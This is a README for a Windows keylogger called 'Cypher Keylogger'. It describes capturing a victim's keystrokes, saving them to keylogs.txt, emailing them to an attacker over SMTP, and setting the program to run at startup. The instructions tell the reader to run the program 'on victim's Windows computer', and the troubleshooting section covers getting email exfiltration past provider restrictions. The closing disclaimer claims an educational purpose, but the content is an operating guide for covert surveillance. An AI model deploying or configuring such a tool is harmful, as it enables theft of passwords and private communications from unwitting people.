# Cypher Keylogger

**DESCRIPTION:**

**Note that by default, [L CTRL + F12] is the only way to stop the keylogger once it is running.**

This is a basic keylogger. It captures keystrokes and records them locally in a file ``keylogs.txt``.

After a certain number of keystrokes (specified by the attacker), the script will email ``keylogs.txt`` to a specified email address. Duwe to Google's security features, the sender email address cnnot be a gmail account.

Additionally, immediately after the keylogger is stopped, the script will email ``keylogs.txt`` to a specified email address.

---

**INSTRUCTIONS:**

By default, this keylogger will periodically send the vivtim's keystrokes to the attacker via email. To disable this feature, set ``PUBLIC_IP`` to ``None`` in ``settings.py``

```
PUBLIC_IP = None
```

- [Specify recipient address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
- [Specify sender address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
- [Enter sender email address password](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L2)
- [Specify SMTP server](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/settings.py#L21)
- Run the program on victim's Windows computer
- Press [Left CTRL + F12] to stop the keylogger

---

**FEATURES:**

- Local Storage: Stores logs in a file ``keylogs.txt``.
- Email: Sends logs to a specified email address. Note: You must specify the following:
  - Recipient email address
  - Sender email address
  - Sender email address account password
  - SMTP server
  - Port number (default is 465)
- Program will automatically run at startup after it is manually executed once

---

**TROUBLESHOOTING:**

`<u>`If you connection to the SMPT server is closing unexpectedly, or you get an error message stating that the username and password cobination is incorrect:`</u>`

- Make sure to allow less-secure (third-party) apps to login to your email address
- Ensure that the smtp server that you provided is up

If your sender email address is a gmail account, and you are getting the following error:

```
smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials k125-20020a37a183000000b005f170f7e497sm4061876qke.47 - gsmtp')
```

Google no longer supports third-party programs to automatically sign into gmail accounts. It is recommended that you use a different email service. You can find more information here: https://support.google.com/accounts/answer/6010255.

If you get the following error:

```
ssl.SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1129)
```

You have two options:

- Make sure that your port number is 465. Port 465 is used for implicit TLS.
- If you do not wish to use port 465, change [this line of code](https://github.com/bmattblake/Keylogger/blob/d992c8f8be0de920a1887fe8953062fe032b82be/keylogger.py#L112) from:
  ``server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)``
  to:
  ``server = smtplib.SMTP(SMTP_SERVER, PORT)``

---

**DISCLAIMER:**

This keylogger was made for educational purposes only. I do not condone any use of this keylogger for malicious intent.
